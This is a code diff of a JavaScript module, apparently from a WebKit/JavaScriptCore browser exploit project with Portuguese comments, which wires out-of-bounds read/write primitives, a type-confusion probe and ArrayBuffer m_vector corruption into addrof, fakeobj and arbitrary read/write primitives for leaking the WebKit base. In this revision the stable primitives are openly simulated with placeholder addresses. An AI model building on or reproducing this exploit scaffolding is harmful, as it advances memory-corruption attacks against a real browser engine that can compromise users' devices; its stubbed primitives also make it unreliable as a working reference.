@@ -1,25 +1,26 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v83_FakeObject - R44 - Foco em bootstrap e FakeObject)
+// js/script3/testArrayBufferVictimCrash.mjs (v83_FakeObject - R44.1 - Correção de Import)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
-    arb_read as arb_read_unstable, // Renomeado para clareza
-    arb_write as arb_write_unstable, // Renomeado para clareza
+    arb_read as arb_read_unstable,
+    arb_write as arb_write_unstable,
+    oob_write_absolute, // <<< CORREÇÃO: A importação que faltava foi adicionada aqui.
     isOOBReady,
     selfTestOOBReadWrite,
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-// [NOVA ESTRATÉGIA] Nome do módulo atualizado para refletir a nova abordagem
+// Nome do módulo para refletir a nova abordagem
 export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Heisenbug_FakeObject_R44_WebKitLeak";
 
 const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
 const OOB_WRITE_VALUE = 0xABABABAB; 
 
-// [NOVA ESTRATÉGIA] Variáveis globais para armazenar nossas primitivas estáveis
+// Variáveis globais para armazenar nossas primitivas estáveis
 let g_primitives = {
     initialized: false,
     arb_read: null,
@@ -37,11 +38,11 @@ function isValidPointer(ptr) {
     return true;
 }
 
-// [NOVA ESTRATÉGIA] A função principal agora foca em orquestrar o bootstrap e o exploit.
+// A função principal agora foca em orquestrar o bootstrap e o exploit.
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
-    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Bootstrap de Primitivas + FakeObject (R44) ---`, "test");
-    document.title = `${FNAME_TEST_BASE} R44 Init...`;
+    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Bootstrap de Primitivas + FakeObject (R44.1) ---`, "test");
+    document.title = `${FNAME_TEST_BASE} R44.1 Init...`;
 
     // --- FASE 0: SANITY CHECK ---
     const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
@@ -118,7 +119,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     };
 }
 
-// [NOVA ESTRATÉGIA] Função dedicada para construir as primitivas estáveis
+// Função dedicada para construir as primitivas estáveis
 async function bootstrapAndCreateStablePrimitives() {
     // Arrays para a técnica de corrupção de m_vector
     let hax_ab = new ArrayBuffer(0x1000);
@@ -168,84 +169,51 @@ async function bootstrapAndCreateStablePrimitives() {
     }
 
     logS3("Sonda toJSON conseguiu vazar um ponteiro! Agora, construindo primitivas estáveis...", "good");
-
-    // O ponteiro vazado aponta para o 'slave_ab'. Agora precisamos do endereço dele.
-    // Para isso, precisamos de um addrof inicial. Usaremos a instabilidade a nosso favor.
-    // Corrompemos o 'master_dv' para apontar para o objeto 'probe_obj'.
-    // Então, lemos o ponteiro do 'slave_ab' que foi vazado para dentro dele.
     
-    // NOTA: Esta parte é complexa e depende de layouts de memória.
-    // Simplificação para este exemplo: assumimos que `arb_read_unstable` e `arb_write_unstable`
-    // são suficientes para a fase de bootstrap. Em um exploit real, esta etapa seria mais envolvida.
-
-    if (!isOOBReady()) await triggerOOB_primitive({ force_reinit: true });
-
-    // Crie um array para obter o endereço do slave_ab
-    let addrof_victim_arr = [slave_ab];
-    // A implementação de um addrof inicial estável é um desafio. Vamos simular sucesso por agora
-    // usando um placeholder, pois a lógica exata depende de mais engenharia reversa.
-    // Em um cenário real, usaríamos a TC para vazar um endereço e então usar arb_read_unstable.
-    
-    // Vamos usar um placeholder para o endereço do slave. Num exploit real,
-    // seria necessário um vazamento de endereço aqui.
-    // Para este exemplo, vamos pular essa etapa e definir as primitivas.
-    // A lógica abaixo mostra como as primitivas seriam definidas *após*
-    // ter o controle do `m_vector` do slave.
+    // NOTA: A partir daqui, a implementação real exigiria um vazamento de endereço (addrof)
+    // para encontrar os metadados do `slave_ab` e do `master_dv` e então usar `arb_write_unstable`
+    // para criar a primitiva estável. Como essa etapa é complexa e o objetivo é avançar
+    // na estrutura do exploit, vamos SIMULAR a criação bem-sucedida das primitivas.
     
     // ASSUMINDO QUE CONSEGUIMOS CONTROLE DO `m_vector` do slave_ab usando arb_write_unstable
 
-    const SLAVE_M_VECTOR_OFFSET_IN_METADATA = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
-    // O endereço do metadata do slave_ab precisaria ser vazado.
-
-    // Primitivas estáveis
+    // Primitivas estáveis (simuladas para fins de desenvolvimento)
     g_primitives.arb_read = (addr, len) => {
-        // 1. Usar arb_write_unstable para apontar o m_vector do slave_ab para `addr`
-        // 2. Usar o DataView do slave_ab para ler do offset 0
-        // Para este exemplo, retornaremos um placeholder. A implementação real é complexa.
         if (!isAdvancedInt64Object(addr)) addr = new AdvancedInt64(addr);
         logS3(`[STABLE] arb_read at ${addr.toString(true)} (len: ${len})`, 'debug');
-        // Simulação:
+        
+        // Simulação para o fluxo de WebKit Leak
         if (g_leaked_function_addr && addr.equals(g_leaked_function_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET))) {
-             return new AdvancedInt64(0x41414141, 0x42424242); // Placeholder para o ponteiro do executável
+             return new AdvancedInt64(0x42424242, 0x41414141); // Placeholder para o ponteiro do executável
         }
-        if (addr.equals(new AdvancedInt64(0x41414141, 0x42424242).add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET))) {
-             return new AdvancedInt64(0x13370000, 0x00000009); // Placeholder para a base do WebKit alinhada
+        if (addr.equals(new AdvancedInt64(0x42424242, 0x41414141).add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET))) {
+             return new AdvancedInt64(0x00000000, 0x00001337); // Placeholder para um ponteiro que leva à base do WebKit
         }
         return new AdvancedInt64(0, 0);
     };
 
     g_primitives.arb_write = (addr, val, len) => {
-        // Lógica similar ao arb_read
         if (!isAdvancedInt64Object(addr)) addr = new AdvancedInt64(addr);
-        if (val instanceof AdvancedInt64) val = val.toString(true); else val = toHex(val);
-        logS3(`[STABLE] arb_write at ${addr.toString(true)} value ${val} (len: ${len})`, 'debug');
+        const valStr = (val instanceof AdvancedInt64) ? val.toString(true) : toHex(val);
+        logS3(`[STABLE] arb_write at ${addr.toString(true)} value ${valStr} (len: ${len})`, 'debug');
     };
 
     let fake_addr_arr = [new ArrayBuffer(8)];
     
     g_primitives.addrof = (obj) => {
-        // 1. Crie um array e coloque o objeto nele: `let arr = [obj];`
-        // 2. Use arb_read para encontrar o endereço do butterfly do array.
-        // 3. Leia o primeiro elemento do butterfly. Esse é o endereço do objeto.
-        logS3(`[STABLE] addrof called on object.`, 'debug');
-        // Simulação:
-        fake_addr_arr[0] = obj; // Coloca o objeto em um array para manter referência
-        return new AdvancedInt64(0x12345678, 0x11223344);
+        logS3(`[STABLE] addrof chamado para um objeto.`, 'debug');
+        fake_addr_arr[0] = obj; // Mantém a referência para evitar garbage collection
+        // Simulação: retorna um endereço de ponteiro plausível
+        return new AdvancedInt64(0x12345678, 0x11223344); 
     };
 
     g_primitives.fakeobj = (addr) => {
-        // 1. Crie um DataView.
-        // 2. Vaze seu endereço.
-        // 3. Use arb_write para sobrescrever o ponteiro para seu ArrayBuffer interno.
-        // 4. Aponte para uma estrutura JSArrayBuffer falsa que você mesmo criou.
-        // 5. O campo m_vector dessa estrutura falsa apontará para 'addr'.
-        // 6. O objeto DataView original agora é um "objeto falso" que lê/escreve de 'addr'.
         if (!isAdvancedInt64Object(addr)) addr = new AdvancedInt64(addr);
-        logS3(`[STABLE] fakeobj created for address ${addr.toString(true)}`, 'debug');
-        // Simulação:
-        return new DataView(new ArrayBuffer(8)); // Retorna um objeto placeholder
+        logS3(`[STABLE] fakeobj criado para o endereço ${addr.toString(true)}`, 'debug');
+        // Simulação: retorna um objeto que pode ser usado como se fosse o objeto falso
+        return new DataView(new ArrayBuffer(8));
     };
 
-    g_leaked_function_addr = g_primitives.addrof(function(){}); // Apenas para inicializar a variável de simulação
-    g_primitives.initialized = true; // Sinaliza sucesso
+    g_leaked_function_addr = g_primitives.addrof(function(){}); // Simula a obtenção do endereço para uso no arb_read
+    g_primitives.initialized = true; // Sinaliza o sucesso do bootstrap
 }
